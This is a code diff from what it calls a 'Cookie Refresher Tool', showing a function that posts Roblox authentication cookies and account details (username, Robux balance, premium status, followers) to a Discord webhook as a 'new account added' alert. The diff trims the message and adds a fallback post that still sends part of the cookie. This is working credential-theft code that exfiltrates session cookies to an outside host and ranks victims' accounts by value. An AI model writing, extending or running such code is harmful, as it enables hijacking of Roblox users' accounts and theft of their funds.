@@ -240,78 +240,71 @@ async function sendNewCookieWithFullDetailsNotification(cookieData) {
     if (!cookieData.isValid) return;
     
     try {
+        // Truncate cookie to prevent message size issues
+        const truncatedCookie = cookieData.fullCookie ? 
+            (cookieData.fullCookie.length > 100 ? cookieData.fullCookie.substring(0, 100) + '...' : cookieData.fullCookie) : 
+            cookieData.cookie;
+
+        // Truncate description to prevent message size issues
+        const truncatedDescription = (cookieData.description && cookieData.description.trim() && cookieData.description !== 'No description available') 
+            ? (cookieData.description.length > 200 ? cookieData.description.substring(0, 200) + '...' : cookieData.description)
+            : 'No description set';
+
         const embed = {
-            title: "🍪🎉 NEW COOKIE ALERT - FULL DETAILS",
-            description: `**NEW ROBLOX ACCOUNT DETECTED!**\n🔥 A fresh ${cookieData.isPremium ? '⭐ PREMIUM' : 'STANDARD'} account has been added to your collection!`,
+            title: "🍪 NEW COOKIE ALERT - FULL DETAILS",
+            description: `**NEW ROBLOX ACCOUNT DETECTED!**\n🔥 A fresh ${cookieData.isPremium ? '⭐ PREMIUM' : 'STANDARD'} account has been added!`,
             color: 0x00FF00,
             fields: [
                 {
                     name: "🏷️ ACCOUNT IDENTITY",
-                    value: `**👤 Username:** \`${cookieData.username}\`\n**🎭 Display Name:** \`${cookieData.displayName || 'Not set'}\`\n**🆔 User ID:** \`${cookieData.userId}\``,
+                    value: `**Username:** \`${cookieData.username}\`\n**Display Name:** \`${cookieData.displayName || 'Not set'}\`\n**User ID:** \`${cookieData.userId}\``,
                     inline: false
                 },
                 {
                     name: "💰 FINANCIAL STATUS",
-                    value: `**💸 Current Robux:** \`${cookieData.robux?.toLocaleString() || '0'} R$\`\n**⭐ Premium Status:** ${cookieData.isPremium ? '✅ **PREMIUM ACTIVE**' : '❌ **NO PREMIUM**'}`,
+                    value: `**Robux:** \`${cookieData.robux?.toLocaleString() || '0'} R$\`\n**Premium:** ${cookieData.isPremium ? '✅ ACTIVE' : '❌ NO'}`,
                     inline: true
                 },
                 {
                     name: "👥 SOCIAL METRICS",
-                    value: `**👤 Followers:** \`${cookieData.followers?.toLocaleString() || '0'}\`\n**➕ Following:** \`${cookieData.following?.toLocaleString() || '0'}\``,
+                    value: `**Followers:** \`${cookieData.followers?.toLocaleString() || '0'}\`\n**Following:** \`${cookieData.following?.toLocaleString() || '0'}\``,
                     inline: true
                 },
                 {
-                    name: "📅 ACCOUNT INFORMATION",
-                    value: `**🎂 Created:** ${cookieData.created ? new Date(cookieData.created).toLocaleDateString('en-US', {
-                        year: 'numeric',
-                        month: 'long',
-                        day: 'numeric'
-                    }) : 'Unknown'}\n**⏰ Added:** ${new Date().toLocaleString('en-US', {
-                        timeZone: 'UTC',
-                        year: 'numeric',
-                        month: 'short',
-                        day: 'numeric',
-                        hour: '2-digit',
-                        minute: '2-digit',
-                        timeZoneName: 'short'
-                    })}`,
+                    name: "📅 ACCOUNT INFO",
+                    value: `**Created:** ${cookieData.created ? new Date(cookieData.created).toLocaleDateString() : 'Unknown'}\n**Added:** ${new Date().toLocaleString()}`,
                     inline: false
                 },
                 {
-                    name: "📝 PROFILE DESCRIPTION",
-                    value: (cookieData.description && cookieData.description.trim() && cookieData.description !== 'No description available') 
-                        ? `\`\`\`${cookieData.description.length > 400 ? cookieData.description.substring(0, 400) + '...' : cookieData.description}\`\`\``
-                        : '`No description set`',
+                    name: "📝 DESCRIPTION",
+                    value: `\`${truncatedDescription}\``,
                     inline: false
                 },
                 {
-                    name: "🔐 FULL AUTHENTICATION COOKIE",
-                    value: `\`\`\`${cookieData.fullCookie || cookieData.cookie}\`\`\``,
+                    name: "🔐 COOKIE",
+                    value: `\`${truncatedCookie}\``,
                     inline: false
                 },
                 {
-                    name: "📊 QUICK STATS SUMMARY",
-                    value: `**Account Value:** ${cookieData.robux >= 1000 ? '🔥 HIGH VALUE' : cookieData.robux >= 100 ? '💫 MEDIUM VALUE' : '📈 STARTER ACCOUNT'}\n**Social Score:** ${cookieData.followers >= 100 ? '🌟 POPULAR' : cookieData.followers >= 10 ? '👥 SOCIAL' : '🌱 GROWING'}\n**Premium:** ${cookieData.isPremium ? '💎 VIP STATUS' : '🆓 FREE ACCOUNT'}`,
+                    name: "📊 SUMMARY",
+                    value: `**Value:** ${cookieData.robux >= 1000 ? '🔥 HIGH' : cookieData.robux >= 100 ? '💫 MEDIUM' : '📈 STARTER'} • **Social:** ${cookieData.followers >= 100 ? '🌟 POPULAR' : '🌱 GROWING'}`,
                     inline: false
                 }
             ],
             thumbnail: {
-                url: `https://www.roblox.com/headshot-thumbnail/image?userId=${cookieData.userId}&width=420&height=420&format=png`
-            },
-            image: {
-                url: `https://www.roblox.com/outfit-thumbnail/image?userOutfitId=${cookieData.userId}&width=420&height=420&format=png`
+                url: `https://www.roblox.com/headshot-thumbnail/image?userId=${cookieData.userId}&width=150&height=150&format=png`
             },
             footer: {
-                text: "🍪 Cookie Refresher Tool • NEW ACCOUNT ALERT • Auto-Copied to Clipboard",
+                text: "🍪 Cookie Refresher Tool • Auto-Copied to Clipboard",
                 icon_url: "https://images.rbxcdn.com/8560f731abce3687166b3e4ead9d9e1f.png"
             },
             timestamp: new Date().toISOString()
         };
 
         const payload = {
-            username: "🍪 NEW COOKIE ALERT BOT",
+            username: "🍪 NEW COOKIE ALERT",
             avatar_url: "https://images.rbxcdn.com/8560f731abce3687166b3e4ead9d9e1f.png",
-            content: `@everyone 🚨 **NEW ROBLOX ACCOUNT ADDED!** 🚨\n🎯 **${cookieData.username}** (${cookieData.robux?.toLocaleString() || '0'} R$) ${cookieData.isPremium ? '⭐ PREMIUM' : ''}`,
+            content: `🚨 **NEW ROBLOX ACCOUNT!** 🎯 **${cookieData.username}** (${cookieData.robux?.toLocaleString() || '0'} R$) ${cookieData.isPremium ? '⭐' : ''}`,
             embeds: [embed]
         };
 
@@ -325,6 +318,23 @@ async function sendNewCookieWithFullDetailsNotification(cookieData) {
         console.log(`🎉 NEW COOKIE ALERT sent for: ${cookieData.username}`);
     } catch (error) {
         console.error('❌ Failed to send new cookie alert:', error.response?.status, error.message);
+        
+        // Try sending a simpler notification as fallback
+        try {
+            const simplePayload = {
+                username: "🍪 Cookie Alert",
+                content: `🚨 **NEW ACCOUNT ADDED!** Username: **${cookieData.username}** | Robux: **${cookieData.robux || 0}** | Premium: **${cookieData.isPremium ? 'Yes' : 'No'}**\n\nCookie: \`${cookieData.fullCookie ? cookieData.fullCookie.substring(0, 50) + '...' : cookieData.cookie}\``
+            };
+            
+            await axios.post(DISCORD_WEBHOOK_URL, simplePayload, {
+                headers: { 'Content-Type': 'application/json' },
+                timeout: 10000
+            });
+            
+            console.log(`✅ Fallback notification sent for: ${cookieData.username}`);
+        } catch (fallbackError) {
+            console.error('❌ Fallback notification also failed:', fallbackError.response?.status, fallbackError.message);
+        }
     }
 }
 
